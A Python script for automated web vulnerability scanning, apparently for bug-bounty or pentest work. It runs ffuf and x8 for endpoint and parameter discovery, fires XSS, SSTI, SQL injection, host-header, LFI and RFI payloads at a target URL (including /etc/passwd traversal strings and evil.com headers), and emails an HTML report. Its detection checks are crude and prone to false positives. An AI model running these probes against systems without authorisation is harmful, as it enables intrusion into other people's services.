import requests
import urllib.parse
import json
import subprocess
import os
import smtplib
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import html
from datetime import datetime
import argparse

# Step 1: Directory or Endpoint recon with FFUF
def directory_fuzzing(base_url, wordlist):
    # Command to run ffuf
    command = [
        'ffuf', 
        '-w', wordlist, 
        '-u', f"{base_url}/FUZZ", 
        '-X', 'POST', 
        '-X', 'GET', 
        '-o', 'ffufresults.json'
    ]
    
    # Run ffuf to find directories
    with open(os.devnull, 'w') as devnull:
        subprocess.run(command, stdout=devnull, stderr=devnull)
        # subprocess.run(command)

    # Load discovered directories from ffuf results
    directories = []
    with open('ffufresults.json', 'r') as f:
        results = json.load(f)
        for result in results['results']:
            directories.append(result['url'])
            print(f"Found directory: {result['url']}")
    return directories

# Step 2: Param recon with X8
def run_x8(urls_file, param_file):
    command = [
        'x8', 
        '-u', urls_file, 
        '-X', 'GET', 'POST', 
        '-t', 'json', 
        '-w', param_file, 
        '--remove-empty', 
        '-o', 'x8result.json', 
        '-O', 'json'
    ]
    with open(os.devnull, 'w') as devnull:
        subprocess.run(command, stdout=devnull, stderr=devnull)

def load_params_from_x8_results(file_path='x8result.json'):
    with open(file_path, 'r') as f:
        results = json.load(f)

    url_params = []
    for result in results:
        method = result['method']
        url = result['url']
        params = [param['name'] for param in result.get('found_params', [])]
        
        url_params.append({'method': method, 'url': url, 'params': params})
    
    return url_params

# Step 3: Testing payload for looking vulnerabilities
def test_xss(url, params):
    xss_payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>","<img src=x onerror=alert(1)>"]
    vulnerable_params = []
    for param in params:
        for payload in xss_payloads:
            # Uji GET
            payloaded_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = requests.get(payloaded_url)
            if payload in response.text:
                print(f"XSS found (GET) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "XSS"))
            # Uji POST
            response = requests.post(url, json={param: payload})
            if payload in response.text:
                print(f"XSS found (POST) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "XSS"))
                # print(vulnerable_params)
    return vulnerable_params


def test_ssti(url, params):
    ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
    vulnerable_params = []
    
    for param in params:
        for payload in ssti_payloads:
            # Uji GET
            payloaded_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = requests.get(payloaded_url)
            if "49" in response.text:
                print(f"SSTI found (GET) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "SSTI"))
            
            # Uji POST
            response = requests.post(url, json={param: payload})
            if "49" in response.text:
                print(f"SSTI found (POST) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "SSTI"))
    
    return vulnerable_params

def test_sqli(url, params):
    sqli_payloads = ["'", "'test-- -", "'or 1====1-- -"]
    vulnerable_params = []
    for param in params:
        for payload in sqli_payloads:
            # url = "https://nriveoj3a8hfx5dkzk9we4fuhlnfb5zu.oastify.com/testdoang"
            payloaded_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = requests.get(payloaded_url)
            if "error" in response.text or "syntax" in response.text:
                print(f"SQL Injection found (GET) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "SQL Injection"))
            response = requests.post(url, json={'password':'password', param: payload})
            if "error" in response.text or "syntax" in response.text:
                print(f"SQL Injection found (POST) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "SQL Injection"))
    return vulnerable_params

def test_hhi(url, params):
    # List of headers to test for Host Header Injection
    headers_to_test = {
        "Host": "evil.com",
        "X-Forwarded-Host": "evil.com",
        "X-Forwarded-For": "evil.com"
    }  
    # Store vulnerable headers found
    vulnerable_headers = []
    
    for param in params:
        # Iterate through each header in the list and check for vulnerability
        for header_name, header_value in headers_to_test.items():
            # Prepare the headers dictionary
            headers = {header_name: header_value}
            # Send POST request with headers and parameters
            response = requests.post(url, headers=headers, json={param: "test"})
            # Check if the header value is reflected in the response body
            if "evil.com" in response.text:
                print(f"Host Header Injection found ({header_name}) at {url} Payload: {headers}")
                vulnerable_headers.append((url, response.request.method, param, f"{header_name}: {header_value}", "HHI"))  # Store the header and vulnerability type
    return vulnerable_headers  # Return list of vulnerabilities found

def test_lfi(url, params):
    # LFI Payloads
    lfi_payloads = [
        "../../../../../../../../etc/passwd",  # Unix/Linux LFI payload
        "/etc/passwd",                         # Simple LFI payload for Linux
        "../../../../../../../../windows/win.ini",  # Windows LFI payload
        "..\\..\\..\\..\\..\\..\\windows\\win.ini"  # Windows LFI payload using backslashes
    ]

    vulnerable_params = []

    for param in params:
        for payload in lfi_payloads:
            # Uji GET
            payloaded_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = requests.get(payloaded_url)
            if "root:" in response.text or "[extensions]" in response.text:
                print(f"LFI found (GET) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "LFI"))

            # Uji POST
            response = requests.post(url, json={param: payload})
            if "root:" in response.text or "[extensions]" in response.text:
                print(f"LFI found (POST) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "LFI"))

    return vulnerable_params

def test_rfi(url, params):
    # Payload RFI
    rfi_payloads = [
        "https://example.com",  # Menggunakan URL eksternal sebagai payload
        "file:///etc/passwd",            # Payload lokal untuk melihat file di server
    ]
    
    # RFI verification strings
    rfi_verification_strings = [
        "root:",                         # Biasanya ditemukan di file /etc/passwd
        "Warning: include(",             # Indikasi PHP error karena file tidak ditemukan
        "failed to open stream",         # PHP error jika file gagal dibuka
        "Example Domain"                 # Jika sukses buka google
    ]
    
    vulnerable_params = []

    for param in params:
        for payload in rfi_payloads:
            # Uji GET
            payloaded_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = requests.get(payloaded_url)
            if any(verify_string in response.text for verify_string in rfi_verification_strings):
                print(f"RFI found (GET) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "RFI"))
            
            # Uji POST
            response = requests.post(url, json={param: payload})
            if any(verify_string in response.text for verify_string in rfi_verification_strings):
                print(f"RFI found (POST) in {param} at {url} Payload: {payload}")
                vulnerable_params.append((url, response.request.method, param, payload, "RFI"))

    return vulnerable_params

# Step 4: Payload combination and scan for vulnerabilities
def scan_vulnerabilities():
    results = []
    urls = load_params_from_x8_results()  # Load parameters from x8 results
    for entry in urls:
        url = entry['url']
        params = entry['params']
        results.extend(test_xss(url, params))
        results.extend(test_hhi(url,params))
        results.extend(test_lfi(url,params))
        results.extend(test_ssti(url,params))
        results.extend(test_rfi(url,params))
        results.extend(test_sqli(url,params))
    return results

# Step 5: Send report to email
def send_report_via_email_html(vulnerabilities, recipient_email, sender_email, sender_password):
    
    # Get date and time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Create a MIMEMultipart email message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = f"Vulnerability Scan Report - {datetime.now().strftime("%Y-%m-%d")}"
    

    # Define the HTML template for the report
    html_template = f"""
    <html>
    <head>
        <style>
            body {{
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 20px;
            }}
            h1 {{
                color: #333;
            }}
            table {{
                border-collapse: collapse;
                width: 100%;
            }}
            th, td {{
                border: 1px solid #ddd;
                padding: 8px;
            }}
            th {{
                background-color: #f2f2f2;
                text-align: left;
            }}
            tr:hover {{background-color: #f5f5f5;}}
        </style>
    </head>
    <body>
        <h1>Vulnerability Report</h1>
        <p>This report provides a summary of the vulnerabilities identified during the scan on {current_time}.</p>
        <p><strong>Note:</strong> Please be aware that some results may be false positives. It is recommended to validate the findings before taking action.</p>
        <table>
            <thead>
                <tr>
                    <th>URL</th>
                    <th>HTTP Method</th>
                    <th>Parameter</th>
                    <th>Payload</th>
                    <th>Vulnerability Type</th>
                </tr>
            </thead>
            <tbody>
    """
    
    # Add each vulnerability to the table in the HTML template
    for vuln in vulnerabilities:
        if len(vuln) == 5:
            url, method, param, payload, vuln_type = vuln
            html_template += f"""
            <tr>
                <td>{url}</td>
                <td>{method}</td>
                <td>{param}</td>
                <td>{html.escape(payload)}</td>
                <td style="color: red; font-weight: bold;">{vuln_type}</td>
            </tr>
            """
        # else:
        #     print(vuln)
        #     exit()
    
    # Close the HTML template
    html_template += """
            </tbody>
        </table>
    </body>
    </html>
    """
    
    # Attach the HTML report to the email
    msg.attach(MIMEText(html_template, 'html'))
    
    try:
        # Establish a secure connection with the server and send the email
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()
        print(f"Report successfully sent to {recipient_email}")
    except Exception as e:
        print(f"Failed to send email. Error: {e}")

# Main Function to Run All Steps
def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description='Scan with provided URLs and wordlists.')
    parser.add_argument('-u', required=True, help='Base URL for the API')
    parser.add_argument('-w', required=True, help='Path to directory wordlist')
    parser.add_argument('-p', required=True, help='Path to parameter wordlist')

    # Parse the arguments
    args = parser.parse_args()

    # Assign variables from arguments
    base_url = args.u
    dir_wordlist = args.w
    param_wordlist = args.p

    # base_url = "http://127.0.0.1:8000/api"
    # dir_wordlist = "directory.txt"
    # param_wordlist = "param.txt"
    
    # Step 1: Directory Fuzzing
    print("Starting directory fuzzing...")
    discovered_urls = directory_fuzzing(base_url, dir_wordlist)

    # Save URLs to file for X8
    with open('urls.txt', 'w') as f:
        for url in discovered_urls:
            f.write(f"{url}\n")

    # Step 2: Parameter Recon
    print("Running X8 to find parameters...")
    run_x8('urls.txt', param_wordlist)
    # loaded_params = load_params_from_x8_results()

    # Step 3: Vulnerability Scanning
    print("Starting vulnerability scanning...")
    vulnerabilities = scan_vulnerabilities()

    # Step 4: Create and Send Report to email
    recipient_email = ""        # Recipient email
    sender_email = ""           # Sender Email
    sender_password = ""        # App password google account
    send_report_via_email_html(vulnerabilities, recipient_email, sender_email, sender_password)

# Run Main Function
if __name__ == "__main__":
    main()
